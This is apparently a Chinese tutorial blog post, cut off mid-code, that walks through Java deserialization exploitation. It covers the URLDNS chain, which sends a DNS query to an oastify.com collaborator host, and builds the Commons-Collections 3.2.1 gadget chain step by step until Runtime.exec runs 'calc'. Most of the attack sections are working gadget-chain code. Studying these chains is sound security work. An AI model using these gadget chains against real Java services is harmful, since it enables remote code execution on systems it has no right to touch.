    <published>2023-03-21T12:50:23.000Z</published>
    <updated>2023-03-23T05:23:31.203Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序列化与反序列化">序列化与反序列化</h1><p>java序列化是通过<code>ObjectOutputStream</code>类中的<code>writeObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">    objectOutputStream.writeObject(a);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>反序列化是通过<code>ObjectInputStream</code>类中的<code>readObject</code>方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> Object <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>));</span><br><span class="line">    <span class="type">People</span> <span class="variable">people</span> <span class="operator">=</span> (People) objectInputStream.readObject();</span><br><span class="line">    objectInputStream.close();</span><br><span class="line">    <span class="keyword">return</span> people;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化和反序列化这是两个很正常的功能，但我们稍加利用就可以用它来执行恶意代码</p><h1 id="DNSURL">DNSURL</h1><h2 id="readObject">readObject</h2><p><img src="c58b649d5bef48cf88f321c317826a61.png" alt=""></p><p>如果反序列化的类中<code>本身带有readObject方法</code>，那么在反序列化的时候就会调用类中的readObject方法</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里必须是private</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">      objectInputStream.defaultReadObject();</span><br><span class="line">      System.out.println(<span class="string">&quot;people的readObject被调用了&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="d60e544ca13b4b809c3d1f273d2c1441.png" alt="在这里插入图片描述"></p><h2 id="HashMap">HashMap</h2><p>而对于hashmap这个java内置类是可序列化并带有readObject方法的，同时readObject又调用了hash方法<br><img src="f89214c72fc341deb5641f19278037f2.png" alt="在这里插入图片描述">hash方法里又调用了key的hashCode方法<br><img src="f59293f999814a9d8a5e455257cf5dc0.png" alt="在这里插入图片描述"><br>这里的hashCode是Object类中的方法<br><img src="1c29f42171b948709d29e56c833b010b.png" alt="在这里插入图片描述"><br>但URL类中也有一个hashCode方法<br><img src="6f25d1673b064347ad78358b51a122da.png" alt="在这里插入图片描述"><br>这个hashCode会调用handler类的hashCode方法,而getHostAddress会向输入的url发送dns查询请求<br><img src="32965cd52fc241a581c3ba0ed1983f66.png" alt="在这里插入图片描述"><br>总的来说就是<br>HashMap.readObject()-&gt;HashMap.hash()-&gt;key.hashCode()<br>URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p><p>我们如果让URL类作为HashMap的key,就会调用URL.hashCode()，最终调用getHostAddress（）<br>可以通过dnslog来判断getHostAddress方法是否执行，然而仅仅只是以下的方法是不行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://w85euszvkqr7x2s5cjco79cj0a63us.oastify.com&quot;</span>),<span class="number">1</span>);</span><br><span class="line">Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>因为HashMap的put方法已经调用了hash方法<br><img src="0201dc94792d4b76a4be1549a2a78bb2.png" alt="在这里插入图片描述"><br>而且要调用URL的hashcode方法，URL中的私有属性hashCode必须为-1，但在初始化以后该值就变了，所以我们要通过反射的方法，将hashCode重新变为-1</p><h2 id="反射">反射</h2><p>Java中的反射是指在运行时动态地获取类的信息并操作类的属性、方法和构造函数等。通过反射，可以在运行时获取类的信息，包括类名、父类、接口、方法、属性等，并且可以在运行时动态地创建对象、调用方法、访问属性等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//得到Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> people.getClass();<span class="comment">//通过getClass获取指定对象的Class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;People&quot;</span>);<span class="comment">//通过forName获取指定名字的Class</span></span><br><span class="line"><span class="comment">//获取实例化对象</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">peopleconstructor</span> <span class="operator">=</span> c.getConstructor(<span class="type">int</span>.class,String.class);<span class="comment">//确定实例化方法</span></span><br><span class="line"><span class="type">People</span> <span class="variable">p</span> <span class="operator">=</span> (People)peopleconstructor.newInstance(<span class="number">12</span>,<span class="string">&quot;jack&quot;</span>);<span class="comment">//使用newInstance方法实例化</span></span><br><span class="line"><span class="comment">//获取类的属性</span></span><br><span class="line">Field[] peoplefields = c.getFields();<span class="comment">//获取类中所有的公有属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;age&quot;</span>);<span class="comment">//获取类中名为age的属性</span></span><br><span class="line">Field[] peoplefields = c.getDeclaredFields();<span class="comment">//获取类中所有的私有属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);<span class="comment">//获取类中名为name的私有属性</span></span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);<span class="comment">//允许修改私有属性</span></span><br><span class="line">namefield.set(p,<span class="string">&quot;tony&quot;</span>);<span class="comment">//利用set方法将对象p的name属性的值修改为tony</span></span><br><span class="line"><span class="comment">//调用类里的方法</span></span><br><span class="line">Method[] poplemethods = c.getMethods();<span class="comment">//获取所有的公共方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">changnamemethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;changname&quot;</span>);<span class="comment">//获取changename方法</span></span><br><span class="line">changnamemethod.invoke(p,<span class="string">&quot;perter&quot;</span>);<span class="comment">//调用chanename方法并传入参数“perter”</span></span><br></pre></td></tr></table></figure><h2 id="结果">结果</h2><p>通过反射我们可以在初始化url类以后再把hashCode的值转回-1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://w85euszvkqr7x2s5cjco79cj0a63us.oastify.com&quot;</span>);</span><br><span class="line">Class c=url.getClass();<span class="comment">//获取url的类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);<span class="comment">//得到hashCode属性</span></span><br><span class="line">hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashcodefield.set(url,<span class="number">12345</span>);<span class="comment">//防止在put的时候发送请求，将hashCode的值修改为12345</span></span><br><span class="line">hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">hashcodefield.set(url,-<span class="number">1</span>);<span class="comment">//将hashCode的值修改为-1</span></span><br><span class="line">Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>那么在序列化的时候dnslog就不会收到dns请求<br>而反序列化的时候就会收到dns请求了<br><img src="9eec5831654c4b729f22aa1b5be6eac7.png" alt="在这里插入图片描述"></p><h1 id="Commonscollections">Commonscollections</h1><h2 id="环境">环境</h2><p>使用的jdk版本是8u65（需要在<code>8u71</code>以下），同时下载对应的openjdk，并复制sun文件添加进idea</p><p>Commonscollections使用的版本是存在漏洞的<code>3.2.1</code>版本</p><h2 id="InvokerTransformer">InvokerTransformer</h2><p>maven包中有一个<code>Transformer</code>接口，定义了一个transform方法，有非常多的实现类</p><p><img src="image-20230321214051542.png" alt="image-20230321214051542"></p><p>其中主要产生漏洞的是<code>InvokerTransformer</code>类的transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokerTransformer构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//transform方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>transform方法会通过反射来调用input对象的methodName方法，其中传入的参数为args，参数类型为paramTypes，故此以下代码就会调出计算机</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a.b(c)=new InvokerTransformer(b,new Class[]&#123;c对应的类对象&#125;,new Object[]&#123;c&#125;).transform(a);</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>我们的目标是找到一个重写了readObject的类，通过一条利用链最终调用这个transform方法</p><h2 id="TransformedMap">TransformedMap</h2><p>接下来要找一下谁调用了nvokerTransformer类的transform方法（最好不同名字）</p><p>可以看到在TransformedMap的checkSetValue中有被调用</p><p><img src="image-20230321221426491.png" alt="image-20230321221426491"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这里就要让<code>TransformedMap.valueTransformer=invokerTransformer对象</code></p><p>而TransformedMap有个<code>decorate</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>利用链：TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</code></p><p>命令执行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">TransformedMap.decorate(map,null,invokerTransformer);</span><br></pre></td></tr></table></figure><h2 id="AbstractInputCheckedMapDecorator">AbstractInputCheckedMapDecorator</h2><p>然后去找调用了checkSetValue的方法，发现只有一个AbstractInputCheckedMapDecorator的setValue方法</p><p><img src="image-20230321222118113.png" alt="image-20230321222118113"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);<span class="comment">//从这一行可以推断出是对entry.setValue()方法的重写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很明显是对entry.setValue()方法的一个重写，所以我们只需要在迭代器遍历Map时执行entry.setValue()即可</p><p><code>利用链：AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</code></p><p>命令执行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">    entry.setValue(runtime);<span class="comment">//这里的“value”也就是InvokerTransformer.transform(Object input)中的input,所以是runtime对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20230321224034922.png" alt="image-20230321224034922"></p><p>接下类同样得去找一个类调用了setValue()方法，并且这个类最好是通过readObject调用的</p><h2 id="AnnotationInvocationHandler">AnnotationInvocationHandler</h2><p>最终我们找到了sun.reflect.annotation.AnnotationInvocationHandler类中的readObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(<span class="comment">//这里调用了setValue()方法！！！</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化的时候会通过迭代器遍历this.memberValues，所以这里要让<code>this.memberValues=transformedMap</code></p><p>来看看AnnotationInvocationHandler类的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个构造方法没有修饰符只具有包级别访问权限，所以这里我们只能通过反射来调用来实例化对象，同时第一个参数只允许是注解类型或其子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap);</span><br></pre></td></tr></table></figure><h2 id="存在的问题">存在的问题</h2><p>目前已经可以将我们构造的map传进去了，但仍然面临几个问题</p><p>1.Runtime类没有实现Serializable，无法反序列化</p><p>2.要想程序执行到setValue()方法，前面有2个if判断语句得想办法</p><p>3.AnnotationInvocationHandler类里的setvalue()参数为</p><p>new AnnotationTypeMismatchExceptionProxy(value.getClass() + “[” + value + “]”).setMember(annotationType.members().get(name))</p><p>但这并不是我们想传入的参数</p><p>一个一个来解决吧</p><h3 id="Runtime类反序列化">Runtime类反序列化</h3><p>我们可以通过<code>反射+ChainedTransformer</code>来解决</p><p>反射创建Runtime实例并调用exec()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class  c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method m = c.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime r = (Runtime) m.invoke(null,null);</span><br><span class="line">Method execmethod = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">execmethod.invoke(r,&quot;calc&quot;);</span><br><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>将上述代码转换成用InvokerTransformer类的transform方法实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> (Method)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(m);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>这里有一个特征，第一行的结果作为第二行的输入，而第二行的结果又作为第三行的输入，且都是transform方法，ChainedTransformer类的transform方法刚好有这个功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">     iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);<span class="comment">//前一对象transform方法的输出作为后一对象transform方法的输入</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以又可以将代码转换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><img src="image-20230322175528965.png" alt="image-20230322175528965"></p><p>到这里就可以解决Runtime类反序列化的问题了，并且此时调用的transform方法也从最初的InvokerTransformer.transform(runtime)变成了<code>ChainedTransformer.transform(Runtime.class)</code></p><h3 id="2个if判断语句">2个if判断语句</h3><p>首先是第一个if，核心代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);<span class="comment">//获取指定类型的注解类型</span></span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; 